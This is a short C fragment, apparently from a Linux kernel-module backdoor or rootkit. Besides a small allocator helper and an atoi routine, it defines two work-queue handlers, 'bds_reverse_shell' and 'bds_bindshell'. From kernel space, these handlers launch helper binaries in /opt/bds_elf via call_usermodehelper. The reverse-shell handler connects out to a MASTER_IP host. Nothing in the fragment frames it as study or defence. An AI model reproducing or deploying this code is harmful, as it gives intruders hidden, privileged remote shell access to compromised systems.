static inline char *n_kmalloc(ssize_t size)  {
	char *retme;
	
	retme = kzalloc((size + 1) * sizeof(char), GFP_KERNEL);
	
	return retme;
}

void bds_reverse_shell(struct work_struct *work) {
	int rc;     
	char* argv[] = {"/opt/bds_elf/bds_rr", MASTER_IP, NULL};

	rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

void bds_bindshell(struct work_struct *work) {
	int rc;     
        char* argv[] = {"/opt/bds_elf/bds_br",  NULL};

	rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static inline int atoi(char *str) {
        int res = 0, i;
	
        for (i = 0; str[i] >= '0' && str[i] <= '9'; ++i)
                res = 10 * res + str[i] - '0';
        return res;
}

